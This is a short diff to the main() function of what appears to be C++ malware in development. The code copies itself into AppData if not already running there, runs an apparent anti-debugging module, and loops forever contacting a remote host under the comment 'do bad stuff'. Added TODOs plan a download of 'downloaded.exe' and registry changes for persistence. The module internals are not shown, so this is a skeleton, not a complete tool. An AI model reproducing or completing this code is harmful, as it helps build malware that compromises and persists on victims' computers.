@@ -18,8 +18,7 @@ int main()
 	RM remvModule;
 	DB debgModule;
 	UTIL util;
-	util.isExecutingFromAppData();
-
+	
 	if (!util.isExecutingFromAppData()) {
 		copyModule.execute();
 		debgModule.execute();
@@ -27,15 +26,17 @@ int main()
 		return 0;
 	}
 
+	//TODO check if downloaded.exe exists before retrieving
+	//TODO modify registry keys
 
 	connModule.setPathName("/");
 	connModule.setHostName("www.google.com");
 
 	while (true) {
 		// do bad stuff
-		Sleep(20000);
 		debgModule.execute();
 		connModule.execute();
+		Sleep(20000);
 	}
 }
 
